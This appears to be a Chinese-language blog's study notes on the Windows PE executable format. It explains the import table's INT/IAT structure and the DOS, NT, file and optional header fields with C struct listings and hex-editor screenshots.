<td align="left">DWORD</td>
<td align="left">时间戳</td>
</tr>
<tr>
<td align="left">ForwarderChain</td>
<td align="left">DWORD</td>
<td align="left">链表的前一个结构</td>
</tr>
<tr>
<td align="left">Name</td>
<td align="left">DWORD</td>
<td align="left">RVA，指向DLL名字，该名字以‘\0’为结尾</td>
</tr>
<tr>
<td align="left">FirstThunk</td>
<td align="left">DWORD</td>
<td align="left">RVA指向IMAGE_THUNK_DATA结构数组 （桥2）</td>
</tr>
</tbody></table>
<h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4><p>标志 为0表示结束 没有导入描述符了</p>
<h4 id="IMAGE-THUNK-DATA"><a href="#IMAGE-THUNK-DATA" class="headerlink" title="IMAGE_THUNK_DATA"></a>IMAGE_THUNK_DATA</h4><p>在介绍OriginalFirstThunk之前，要先了解一下OriginalFirstThunk和FirstThunk所指向的<strong>结构数组</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015164516486.png" alt="image-20211015164516486"></p>
<p>指向的数组中每一项为一个结构，此结构名称是<strong>IMAGE_THUNK_DATA</strong></p>
<p>数组<strong>最后以一个内容全为0的IMAGE_THUNK_DATA作为结束</strong></p>
<p>IMAGE_THUNK_DATA实际上只是一个DWORD，但在不同的时刻却拥有不同的解释</p>
<p>IMAGE_THUNK_DATA有<strong>两种解释</strong>：</p>
<ul>
<li>DWORD最高位为0，那么该数值是一个RVA，指向_IMAGE__IMPORT_BY_NAME结构，表明函数是<strong>字符串类型的函数名导入的</strong></li>
<li>DWORD最高位为1，那么该数值的低31位就是函数的<strong>导出函数的序号</strong></li>
</ul>
<p>_IMAGE_IMPORT_BY_NAME结构:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p>该结构即为：”编号—名称”（Hint/Name）描述部分</p>
<ul>
<li>Hint：导出函数地址表的<strong>索引编号</strong>，可能为空且<strong>不一定准确</strong>，由编译器决定，一般不使用该值</li>
<li>Name：这个是一个以”\0”结尾的字符串，表示函数名</li>
</ul>
<p>此时可发现，IMAGE_THUNK_DATA最终提供的数据只有两个：</p>
<ul>
<li>DWORD最高位为0时：需要导入函数的名称（Hint不一定准确，所以不使用）</li>
<li>DWORD最高位为1时：需要导入的函数在导出表中的序号</li>
</ul>
<p>此处对应了导出表笔记中的由导出表获得导出函数所需的两种方法</p>
<ol>
<li>根据函数名称获取导出函数地址</li>
<li>根据函数序号获取导出函数地址</li>
</ol>
<h4 id="OriginalFirstThunk"><a href="#OriginalFirstThunk" class="headerlink" title="OriginalFirstThunk"></a>OriginalFirstThunk</h4><p>因为它是指向另外数据结构的通路，因此简称为桥1。该字段指向一个包含了一系列结构的数组：IMAGE_THUNK_DATA</p>
<p>桥1所指向的地址列表被定义为：<strong>INT</strong>（Import Name Table） 导入名称表</p>
<h2 id="导入表的双桥结构"><a href="#导入表的双桥结构" class="headerlink" title="导入表的双桥结构"></a>导入表的双桥结构</h2><p>桥1 与 桥 2 最终的目的地都是一致的，都指向了引入函数的“编号-名称”（Hint/Name）描述部分</p>
<p>桥1到IMAGE_THUNK_DATA的过程中，经过了：<strong>INT</strong>（Import Name Table) 导入名称表</p>
<p>而桥2到IMAGE_THUNK_DATA的过程中，经过了: <strong>IAT</strong>（Import Address Table）导入地址表</p>
<h4 id="PE文件加载前"><a href="#PE文件加载前" class="headerlink" title="PE文件加载前"></a>PE文件加载前</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015193909496.png" alt="image-20211015193909496"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194546419.png" alt="image-20211015194546419"></p>
<h4 id="PE文件载入后"><a href="#PE文件载入后" class="headerlink" title="PE文件载入后"></a>PE文件载入后</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194834185.png" alt="image-20211015194834185"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194759949.png" alt="image-20211015194759949"></p>
<h4 id="加载前后对比"><a href="#加载前后对比" class="headerlink" title="加载前后对比"></a>加载前后对比</h4><ul>
<li>在PE文件加载前: 桥1指向INT和桥2指向的IAT的数据是<strong>相同</strong>的,但是其<strong>存储的位置是不同的</strong></li>
<li>在PE文件加载后：桥1指向的INT<strong>不变</strong>，但桥2指向的IAT的数值变成了函数相应的RVA地址</li>
</ul>
<p>另：函数相应的RVA地址是根据IAT中的函数名称或者导入表中的序号获得的。</p>
<h4 id="根据结构分析导入表"><a href="#根据结构分析导入表" class="headerlink" title="根据结构分析导入表"></a>根据结构分析导入表</h4><p>回到先前得到的导入表的FOA，在16进制编辑器中跳转至FOA：0x1CDA7C位置</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-PE结构-系统解密篇(1)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/12/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87(1)/" class="article-date">
      <time datetime="2021-10-12T02:42:01.000Z" itemprop="datePublished">2021-10-12</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/12/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87(1)/">PE结构-系统解密篇（1）</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><strong>学习课程-鱼C-小甲鱼【系统篇】《解密系列》单看课程记不住，想着好记性不如烂笔头，特此记录学习加深理解。</strong></p>
<h2 id="PE结构的概念"><a href="#PE结构的概念" class="headerlink" title="PE结构的概念"></a>PE结构的概念</h2><h3 id="EXE与DLL文件的区别"><a href="#EXE与DLL文件的区别" class="headerlink" title="EXE与DLL文件的区别"></a>EXE与DLL文件的区别</h3><p>EXE与DLL文件之间的区别完全是语意上面的，因为他们使用了完全相同的PE格式。唯一的区别在与是用一个字段标示出这个文件是EXE还是DLL文件格式。 </p>
<h3 id="64位与32位PE文件的区别"><a href="#64位与32位PE文件的区别" class="headerlink" title="64位与32位PE文件的区别"></a>64位与32位PE文件的区别</h3><p>64位的Windows仅仅知识对PE格式做了一些简单的修饰，新格式叫做PE32+ 并没有任何新的结构加进去，改变的只是简单的将32位字段扩展为64位，一般会在名称上表现出来：例如IMAGE_NT_HEADERS32 或 IMAGE_NT_HEADER64 来表示此结构用于32位还是64位PE文件。</p>
<h3 id="PE格式的定义"><a href="#PE格式的定义" class="headerlink" title="PE格式的定义"></a>PE格式的定义</h3><p>PE格式定义的主要地方位于头文件winnt.h，这个头文件中几乎能找到所有关于PE文件的定义。</p>
<p><strong>PE文件的架构结构</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012105635817.png" alt="image-20211012105635817"></p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li><p>PE文件使用的是一个平面地址空间，所有代码和数据都被合并在一起，组成一个很大的结构。</p>
</li>
<li><p>文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。</p>
</li>
<li><p>此外，区块中的每个块有自己在内存中的一套属性，比如说这个区块是否包含代码，数据，是否可读或可写等权限的限制。</p>
</li>
<li><p>PE文件并不是作为单一内存映射文件而被装入内存的；Windows装载器(PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到 映射到较高的内存地址。映射后其结构某项的偏移地址可能区别于原始的偏移地址，但文件的整体结构不会发生改变。</p>
</li>
<li><p>磁盘文件一旦被映射装入内存，磁盘上的数据结构布局和内存中的数据结构布局是一致的。</p>
</li>
<li><p>数据之间的相对位置可能会发生改变，其某项的偏移地址可能会区别与原始的偏移地址，但不管如何，所有表现出来的信息都允许（接受）从磁盘文件偏移到内存偏移的转换。</p>
</li>
<li><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012111242647.png" alt="image-20211012111242647"></p>
</li>
<li><p>PE文件块之间之所以会产生空隙，是因为需要进行对齐，便于磁盘内存管理。</p>
</li>
<li><p>PE文件通过Windows装载器装载进内存中后，DOS头、PE头和区块表的偏移位置与大小均不会发生改变，而各个区块映射到内存中后，其偏移位置则会发生改变。</p>
</li>
<li><p>磁盘中的PE文件与内存中的模块之间的偏移位置有可能会发生变化，是由于IMAGE_OPTIONAL_HEADER结构中的FileAlignment 与 SectionAlignment之间的值不同导致对齐标准不一而造成的。</p>
</li>
</ul>
<h3 id="PE结构的几个概念"><a href="#PE结构的几个概念" class="headerlink" title="PE结构的几个概念"></a>PE结构的几个概念</h3><p><strong>基地址 （ImageBase）</strong></p>
<p>是PE文件映射到内存文件后的PE结构的头地址，这个地址被称之为基地址。PE文件被映射到内存中后我们可以称之为一个<strong>模块(Module)</strong> , 其内存中的基地址就是模块的<strong>句柄(HModule)</strong>,获得句柄之后，也就是拿到了Pe结构的头部，根据头部中所存放的信息，我们拿到整个PE文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LPCTSTR lpModulename 存有模块名的指针</span></span><br><span class="line"><span class="comment">//函数返回对应模块的句柄</span></span><br><span class="line"><span class="function">HMODULE <span class="title">GetModuleHandle</span><span class="params">(LPCTSTR lpModuleName)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>文件偏移地址</strong></p>
<p>PE文件的头地址在自身PE结构中都以0为开始地址，其他区块较头地址所相差的地址即为偏移地址</p>
<p><strong>虚拟地址(VA)与相对虚拟地址(RVA)</strong></p>
<p>虚拟地址:各个区块映射至内存之中可能会发生比例变化，为指出在内存中已经发生比例变化的各个区块的 地址，引出了**虚拟地址(VA)**的概念 。</p>
<p>相对虚拟地址:与PE文件的偏移地址相似，某一虚拟地址-基地址=相对虚拟地址</p>
<h2 id="各大部分"><a href="#各大部分" class="headerlink" title="各大部分"></a>各大部分</h2><p>MS-DOS头部</p>
<ul>
<li><p>根据上文的结构图可知，PE文件首个部分便是DOS头，有了DOS头，我们才能在DOS环境下执行PE文件，DOS系统才可识别出这是一个有效的执行体来从而执行。</p>
</li>
<li><p>PE文件的第一个字节起始于一个传统的MS-DOS头部，被称为IMAGE_DOS_HEADER。</p>
</li>
</ul>
<p><strong>IMAGE_DOS_HEADER</strong>(左侧+0h一列是文件头的偏移量)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h WORD e_magic    <span class="comment">// Magic DOS signature MZ(4Dh 5Ah)     DOS可执行文件标记</span></span><br><span class="line">+<span class="number">2</span>h WORD e_cblp    <span class="comment">// Bytes on last page of file</span></span><br><span class="line">+<span class="number">4</span>h WORD e_cp    <span class="comment">// Pages in file</span></span><br><span class="line">+<span class="number">6</span>h WORD e_crlc    <span class="comment">// Relocations</span></span><br><span class="line">+<span class="number">8</span>h WORD e_cparhdr   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">+<span class="number">0</span>ah WORD e_minalloc   <span class="comment">// Minimun extra paragraphs needs</span></span><br><span class="line">+<span class="number">0</span>ch WORD e_maxalloc  <span class="comment">// Maximun extra paragraphs needs</span></span><br><span class="line">+<span class="number">0</span>eh WORD e_ss            <span class="comment">// intial(relative)SS value        DOS代码的初始化堆栈SS</span></span><br><span class="line">+<span class="number">10</span>h WORD e_sp     <span class="comment">// intial SP value                       DOS代码的初始化堆栈指针SP</span></span><br><span class="line">+<span class="number">12</span>h WORD e_csum     <span class="comment">// Checksum</span></span><br><span class="line">+<span class="number">14</span>h WORD e_ip     <span class="comment">// intial IP value               DOS代码的初始化指令入口[指针IP]</span></span><br><span class="line">+<span class="number">16</span>h WORD e_cs     <span class="comment">// intial(relative)CS value         DOS代码的初始堆栈入口</span></span><br><span class="line">+<span class="number">18</span>h WORD e_lfarlc     <span class="comment">// File Address of relocation table</span></span><br><span class="line">+<span class="number">1</span>ah WORD e_ovno         <span class="comment">// Overlay number</span></span><br><span class="line">+<span class="number">1</span>ch WORD e_res[<span class="number">4</span>]      <span class="comment">// Reserved words</span></span><br><span class="line">+<span class="number">24</span>h WORD e_oemid      <span class="comment">// OEM identifier(for e_oeminfo)</span></span><br><span class="line">+<span class="number">26</span>h WORD      e_oeminfo   <span class="comment">// OEM information;e_oemid specific</span></span><br><span class="line">+<span class="number">29</span>h WORD e_res2[<span class="number">10</span>]   <span class="comment">// Reserved words</span></span><br><span class="line">+<span class="number">3</span>ch DWORD   e_lfanew     <span class="comment">//  Offset to start of PE header      指向PE文件头</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e_magic：一个WORD类型，值是一个常数<span class="number">0x4D5A</span>，用文本编辑器查看该值位‘MZ’，可执行文件必须都是<span class="string">&#x27;MZ&#x27;</span>开头。</span><br><span class="line">e_lfanew：为<span class="number">32</span>位可执行文件扩展的域，用来表示DOS头之后的NT头相对文件起始地址的偏移。</span><br></pre></td></tr></table></figure>



<h3 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h3><ul>
<li>PE文件头（PE Header）紧挨着DOS stub</li>
<li>PE Header是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，里面包含着许多PE装载器用到的重要字段</li>
<li>执行体在支持PE文件结构的操作系统中执行时，PE装载器将从IMAGE_DOS_HEADER结构中的e_lfanew字字段里找到PE Header的起始偏移量，加上基地址就得到PE文件头的指针</li>
<li>PNTHeader  = ImageBase + dosHeader -&gt;e_lfanew</li>
</ul>
<h3 id="IMAGE-NT-HEADERS结构"><a href="#IMAGE-NT-HEADERS结构" class="headerlink" title="IMAGE_NT_HEADERS结构"></a>IMAGE_NT_HEADERS结构</h3><p>PE Header 是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，里面包含着许多PE装载器要用到的重要字段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> IMAGE_NT_HEADERS STRUCT </span><br><span class="line">&#123; </span><br><span class="line">+<span class="number">0</span>h  DWORD	Signature  <span class="comment">//标示这是否是一个有效的PE文件</span></span><br><span class="line">+<span class="number">4</span>h  IMAGE_FILE_HEADER FileHeader <span class="comment">//</span></span><br><span class="line">+<span class="number">18</span>	 hIMAGE_OPTIONAL_HEADER32	OptionalHeader   <span class="comment">//</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure>

<p><strong>Signature</strong></p>
<p> 在一个有效的 PE 文件里，Signature 字段被设置为00004550h, ASCII 码字符是“PE00”。标志这 PE 文件头的开始，于16进制编辑器中为50 45 00 00h ,进制转换后为00 00 45 50h。</p>
<p>DOS头部的指针e_lfanew指向PE头的首地址，从而找到PE文件头</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012122520702.png" alt="image-20211012122520702"></p>
<p><strong>IMAGE_FILE_HEADER 结构</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> 	<span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">+<span class="number">04</span>h	WORD  		Machine;                              	<span class="comment">// 运行平台</span></span><br><span class="line"></span><br><span class="line">+<span class="number">06</span>h  	WORD  		NumberOfSections;			<span class="comment">// 文件的区块数目</span></span><br><span class="line"></span><br><span class="line">+<span class="number">08</span>h	DWORD 		TimeDateStamp;			<span class="comment">// 文件创建日期和时间</span></span><br><span class="line"></span><br><span class="line">+<span class="number">0</span>Ch  	DWORD 		PointerToSymbolTable;		<span class="comment">// 指向符号表(主要用于调试)</span></span><br><span class="line"></span><br><span class="line">+<span class="number">10</span>h 	DWORD 		NumberOfSymbols;			<span class="comment">// 符号表中符号个数(同上)</span></span><br><span class="line"></span><br><span class="line">+<span class="number">14</span>h  	WORD  		SizeOfOptionalHeader;		<span class="comment">// IMAGE_OPTIONAL_HEADER32 结构大小</span></span><br><span class="line"></span><br><span class="line">+<span class="number">16</span>h  	WORD  		Characteristics;				<span class="comment">// 文件属性</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_FILE_HEADER,  *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p>（1）Machine：可执行文件的目标CPU类型，WORD类型 长度为4字节</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012123430885.png" alt="image-20211012123430885"></p>
<p>（2）NumberOfSection：区块的数目(IMAGE_NT_HEADERS ) WORD类型 2字节</p>
<p>（3）TimeDataStamp: 表明文件是何时被创建的 DWORD 4字节</p>
<p>​    TimeDataStamp: 表明文件是何时被创建的。</p>
<p>这个值是自1970年1月1日以来用格林威治时间（GMT）计算的秒数，这个值是比文件系统（FILESYSTEM）的日期时间更加精确的指示器</p>
<p>VC的话可以用_ctime 函数或者 gmtime 函数。</p>
<p>（4）PointerToSymbolTable: COFF 符号表的文件偏移位置，现在基本没用了</p>
<p>（5）NumberOfSymbols: 如果有COFF 符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF 符号表的结束位置，则需要这个变量。</p>
<p>（6）SizeOfOptionalHeader: 紧跟着IMAGE_FILE_HEADER 后边的数据结构（IMAGE_OPTIONAL_HEADER）的大小。(对于32位PE文件，这个值通常是00E0h；对于64位PE32+文件，这个值是00F0h )。</p>
<p>SizeOfOptionalHeader相较PE头偏移<strong>14h</strong>注意，偏移量是16进制的，拿到x64位系统下的IMAGE_OPTIONAL_HEADER32的结构大小0x00F0 <strong>(注意大小头问题!!!!)</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012231010016.png" alt="image-20211012231010016"></p>
<p>（7）Characteristics: 文件属性，有选择的通过几个值可以运算得到。( 这些标志的有效值是定义于 winnt.h 内的  IMAGE_FILE_** 的值，具体含义见下表。普通的EXE文件这个字段的值一般是 0100h，DLL文件这个字段的值一般是  210Eh。)多种属性可以通过 “或运算” 使得同时拥有！</p>
<table>
<thead>
<tr>
<th>Value</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>IMAGE_FILE_RELOCS_STRIPPED  0x0001</td>
<td align="center">Relocation information was stripped from the file. The file must be loaded at its preferred base address. If the base address is not available, the loader reports an error.</td>
</tr>
<tr>
<td>IMAGE_FILE_EXECUTABLE_IMAGE0x0002</td>
<td align="center">The file is executable (there are no unresolved external references).</td>
</tr>
<tr>
<td>IMAGE_FILE_LINE_NUMS_STRIPPED0x0004</td>
<td align="center">COFF line numbers were stripped from the file.</td>
</tr>
<tr>
<td>IMAGE_FILE_LOCAL_SYMS_STRIPPED0x0008</td>
<td align="center">COFF symbol table entries were stripped from file.</td>
</tr>
<tr>
<td>IMAGE_FILE_AGGRESIVE_WS_TRIM0x0010</td>
<td align="center">Aggressively trim the working set. This value is obsolete as of Windows 2000.</td>
</tr>
<tr>
<td>IMAGE_FILE_LARGE_ADDRESS_AWARE0x0020</td>
<td align="center">The application can handle addresses larger than 2 GB.</td>
</tr>
<tr>
<td>IMAGE_FILE_BYTES_REVERSED_LO0x0080</td>
<td align="center">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
<tr>
<td>IMAGE_FILE_32BIT_MACHINE0x0100</td>
<td align="center">The computer supports 32-bit words.</td>
</tr>
<tr>
<td>IMAGE_FILE_DEBUG_STRIPPED0x0200</td>
<td align="center">Debugging information was removed and stored separately in another file.</td>
</tr>
<tr>
<td>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP0x0400</td>
<td align="center">If the image is on removable media, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td>IMAGE_FILE_NET_RUN_FROM_SWAP0x0800</td>
<td align="center">If the image is on the network, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td>IMAGE_FILE_SYSTEM0x1000</td>
<td align="center">The image is a system file.</td>
</tr>
<tr>
<td>IMAGE_FILE_DLL0x2000</td>
<td align="center">The image is a DLL file. While it is an executable file, it cannot be run directly.</td>
</tr>
<tr>
<td>IMAGE_FILE_UP_SYSTEM_ONLY0x4000</td>
<td align="center">The file should be run only on a uniprocessor computer.</td>
</tr>
<tr>
<td>IMAGE_FILE_BYTES_REVERSED_HI0x8000</td>
<td align="center">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
</tbody></table>
<h3 id="IMAGE-OPTIONAL-HEADER结构"><a href="#IMAGE-OPTIONAL-HEADER结构" class="headerlink" title="IMAGE_OPTIONAL_HEADER结构"></a>IMAGE_OPTIONAL_HEADER结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> typedef struct _IMAGE_OPTIONAL_HEADER </span><br><span class="line">&#123;</span><br><span class="line">    //</span><br><span class="line">    // Standard fields.  </span><br><span class="line">    //</span><br><span class="line">+18h    WORD    Magic;         // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span><br><span class="line">+1Ah    BYTE      MajorLinkerVersion;     // 链接程序的主版本号</span><br><span class="line">+1Bh    BYTE      MinorLinkerVersion;     // 链接程序的次版本号</span><br><span class="line">+1Ch    DWORD   SizeOfCode;     // 所有含代码的节的总大小</span><br><span class="line">+20h    DWORD   SizeOfInitializedData;    // 所有含已初始化数据的节的总大小</span><br><span class="line">+24h    DWORD   SizeOfUninitializedData; // 所有含未初始化数据的节的大小</span><br><span class="line">+28h    DWORD   AddressOfEntryPoint;    // 程序执行入口RVA</span><br><span class="line">+2Ch    DWORD   BaseOfCode;      // 代码的区块的起始RVA</span><br><span class="line">+30h    DWORD   BaseOfData;      // 数据的区块的起始RVA</span><br><span class="line">    //</span><br><span class="line">    // NT additional fields.    以下是属于NT结构增加的领域。</span><br><span class="line">    //</span><br><span class="line">+34h    DWORD   ImageBase;      // 程序的首选装载地址</span><br><span class="line">+38h    DWORD   SectionAlignment;      // 内存中的区块的对齐大小</span><br><span class="line">+3Ch    DWORD   FileAlignment;      // 文件中的区块的对齐大小</span><br><span class="line">+40h    WORD    MajorOperatingSystemVersion;  // 要求操作系统最低版本号的主版本号</span><br><span class="line">+42h    WORD    MinorOperatingSystemVersion;  // 要求操作系统最低版本号的副版本号</span><br><span class="line">+44h    WORD    MajorImageVersion;       // 可运行于操作系统的主版本号</span><br><span class="line">+46h    WORD    MinorImageVersion;       // 可运行于操作系统的次版本号</span><br><span class="line">+48h    WORD    MajorSubsystemVersion;  // 要求最低子系统版本的主版本号</span><br><span class="line">+4Ah    WORD    MinorSubsystemVersion;  // 要求最低子系统版本的次版本号</span><br><span class="line">+4Ch    DWORD   Win32VersionValue;       // 莫须有字段，不被病毒利用的话一般为0</span><br><span class="line">+50h    DWORD   SizeOfImage;       // 映像装入内存后的总尺寸</span><br><span class="line">+54h    DWORD   SizeOfHeaders;       // 所有头 + 区块表的尺寸大小</span><br><span class="line">+58h    DWORD   CheckSum;       // 映像的校检和</span><br><span class="line">+5Ch    WORD    Subsystem;       // 可执行文件期望的子系统</span><br><span class="line">+5Eh    WORD    DllCharacteristics;       // DllMain()函数何时被调用，默认为 0</span><br><span class="line">+60h    DWORD   SizeOfStackReserve;       // 初始化时的栈大小</span><br><span class="line">+64h    DWORD   SizeOfStackCommit;       // 初始化时实际提交的栈大小</span><br><span class="line">+68h    DWORD   SizeOfHeapReserve;        // 初始化时保留的堆大小</span><br><span class="line">+6Ch    DWORD   SizeOfHeapCommit;        // 初始化时实际提交的堆大小</span><br><span class="line">+70h    DWORD   LoaderFlags;        // 与调试有关，默认为 0 </span><br><span class="line">+74h    DWORD   NumberOfRvaAndSizes;  // 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16</span><br><span class="line">+78h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES] ;</span><br><span class="line">       // 数据目录表,里面的数组[]一直以来都为16个元素,可以直接写为</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[16]</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上结构中的大部分字段都不重要，我们可以从注释中进行理解使用，不必死记硬背，接下来解释其中较为重要的字段</p>
<ul>
<li><p><strong>AddressOfEntryPoint字段</strong>(+28h) DWORD 32位下4 byte</p>
<p>指出文件被执行时的入口地址，这是一个RVA地址(相对虚拟地址)如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要让这个入口地址指向附加的代码就可以了。</p>
<p>PE头基地址为140h+28h偏移并根据大小端模式可看出入口的相对虚拟地址为0X000C0CB4 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012210838177.png" alt="image-20211012210838177"></p>
</li>
<li><p><strong>ImageBase</strong>(+34h)</p>
<p>ImageBase字段指出文件的优先装入地址。也就是说当文件被执行时如果可能的话，Windows优先将文件装入指定的内存地址，若该内存地址已被其他模块占用时，文件才被装入到其他空余的内存地址当中。链接器产生可执行文件的时候对应这个地址来生成机器码。所以当文件可装入这个内存地址时，不需要重定向操作，装入的速度最快，若<strong>ImageBase</strong>指定的内存地址被占用，那么链接器将不得不重定向空余内存地址将PE文件装入，相比之下，会慢上一些。</p>
<p>PE头基地址为140h+34h</p>
